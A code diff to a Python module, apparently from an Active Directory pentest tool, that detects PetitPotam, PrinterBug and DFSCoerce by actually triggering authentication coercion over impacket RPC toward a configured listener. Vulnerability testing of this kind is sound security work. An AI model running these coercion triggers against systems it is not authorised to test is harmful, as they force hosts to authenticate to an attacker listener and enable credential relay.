@@ -4,9 +4,9 @@ Detects PetitPotam, PrinterBug, DFSCoerce, etc.
 Based on NetExec coerce_plus module
 """
 
-from impacket.dcerpc.v5 import transport, rprn, even, epm
-from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT, NDRPOINTER, NDRUniConformantArray, NDRPOINTERNULL
-from impacket.dcerpc.v5.dtypes import LPBYTE, USHORT, LPWSTR, DWORD, ULONG, NULL, WSTR, LONG, BOOL, PCHAR, RPC_SID
+from impacket.dcerpc.v5 import transport, rprn, epm
+from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT, NDRPOINTER, NDRPOINTERNULL
+from impacket.dcerpc.v5.dtypes import LPWSTR, DWORD, ULONG, NULL, WSTR, LONG, BOOL, PCHAR, RPC_SID
 from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
 from impacket.uuid import uuidtup_to_bin
 import contextlib
@@ -19,24 +19,29 @@ class CoercionDetector:
         self.config = config
         self.listener = config.coerce_target
 
-    def detect(self, host: str) -> dict:
+    def detect(self, host: str, target_ip: str = None) -> dict:
         """
         Detect coercion vulnerabilities by actually attempting exploits
         Only reports vulnerable if exploit succeeds (gets callback)
 
+        Args:
+            host: hostname (used for Kerberos SPN, display)
+            target_ip: resolved IP for TCP connection (falls back to host)
+
         Returns:
             dict with vulnerability names as keys and detailed status as values
         """
+        connect_to = target_ip if target_ip else host
         results = {}
 
         # PetitPotam
-        results['PetitPotam'] = self._check_petitpotam(host)
+        results['PetitPotam'] = self._check_petitpotam(host, connect_to)
 
         # PrinterBug
-        results['PrinterBug'] = self._check_printerbug(host)
+        results['PrinterBug'] = self._check_printerbug(host, connect_to)
 
         # DFSCoerce
-        results['DFSCoerce'] = self._check_dfscoerce(host)
+        results['DFSCoerce'] = self._check_dfscoerce(host, connect_to)
 
         return results
 
@@ -53,8 +58,10 @@ class CoercionDetector:
                 self.config.nthash or ''
             )
 
-    def _check_petitpotam(self, host: str) -> dict:
+    def _check_petitpotam(self, host: str, connect_to: str = None) -> dict:
         """Check PetitPotam vulnerability across multiple pipes"""
+        if connect_to is None:
+            connect_to = host
         result = {'vulnerable': False, 'methods': [], 'error': None}
 
         username, password, domain, lmhash, nthash = self._get_credentials()
@@ -69,7 +76,7 @@ class CoercionDetector:
                     domain=domain,
                     lmhash=lmhash,
                     nthash=nthash,
-                    target=host,
+                    target=connect_to,
                     doKerberos=self.config.should_use_kerberos(host),
                     dcHost=self.config.dc_ip,
                     aesKey=self.config.aesKey,
@@ -101,8 +108,10 @@ class CoercionDetector:
 
         return result
 
-    def _check_printerbug(self, host: str) -> dict:
+    def _check_printerbug(self, host: str, connect_to: str = None) -> dict:
         """Check PrinterBug vulnerability"""
+        if connect_to is None:
+            connect_to = host
         result = {'vulnerable': False, 'methods': [], 'error': None}
 
         username, password, domain, lmhash, nthash = self._get_credentials()
@@ -117,7 +126,7 @@ class CoercionDetector:
                     domain=domain,
                     lmhash=lmhash,
                     nthash=nthash,
-                    target=host,
+                    target=connect_to,
                     doKerberos=self.config.should_use_kerberos(host),
                     dcHost=self.config.dc_ip,
                     aesKey=self.config.aesKey,
@@ -149,8 +158,10 @@ class CoercionDetector:
 
         return result
 
-    def _check_dfscoerce(self, host: str) -> dict:
+    def _check_dfscoerce(self, host: str, connect_to: str = None) -> dict:
         """Check DFSCoerce vulnerability"""
+        if connect_to is None:
+            connect_to = host
         result = {'vulnerable': False, 'methods': [], 'error': None}
 
         username, password, domain, lmhash, nthash = self._get_credentials()
@@ -163,12 +174,12 @@ class CoercionDetector:
                 domain=domain,
                 lmhash=lmhash,
                 nthash=nthash,
-                target=host,
+                target=connect_to,
                 doKerberos=self.config.should_use_kerberos(host),
                 dcHost=self.config.dc_ip,
                 aesKey=self.config.aesKey,
                 pipe="netdfs",
-                timeout=self.config.timeout
+                timeout=self.config.coerce_timeout
             )
 
             if dce is not None:
@@ -403,10 +414,20 @@ class PrinterBugTrigger:
             request["pszLocalMachine"] = f"\\\\{listener}\x00"
             request["fdwOptions"] = 0x00000000
             request["dwPrinterLocal"] = 0
-            dce.request(request)
-        except Exception as e:
-            if str(e).find("rpc_s_access_denied") >= 0 or str(e).find("RPC_S_SERVER_UNAVAILABLE") >= 0:
+            try:
+                dce.request(request)
+                # If the call succeeds without error, coercion was triggered
                 successful_methods.append(f"{pipe}\\RpcRemoteFindFirstPrinterChangeNotificationEx")
+            except Exception as e:
+                error_str = str(e)
+                # ERROR_BAD_NETPATH means the target tried to connect to our listener (coercion worked)
+                # rpc_s_access_denied at the notification level means spooler is reachable but denied
+                # the notification request - spooler is active and may still trigger callback
+                if "ERROR_BAD_NETPATH" in error_str:
+                    successful_methods.append(f"{pipe}\\RpcRemoteFindFirstPrinterChangeNotificationEx")
+        except Exception:
+            # hRpcOpenPrinter failed - spooler not accessible via this pipe
+            pass
 
         return successful_methods
 
@@ -522,14 +543,14 @@ class EfsRpcEncryptFileSrv(NDRCALL):
 
 class EFS_HASH_BLOB(NDRSTRUCT):
     structure = (
-        ("Data", DWORD),
-        ("cbData", PCHAR),
+        ("cbData", DWORD),
+        ("pbData", PCHAR),
     )
 
 
 class ENCRYPTION_CERTIFICATE_HASH(NDRSTRUCT):
     structure = (
-        ("Lenght", DWORD),
+        ("Length", DWORD),
         ("SID", RPC_SID),
         ("Hash", EFS_HASH_BLOB),
         ("Display", LPWSTR),
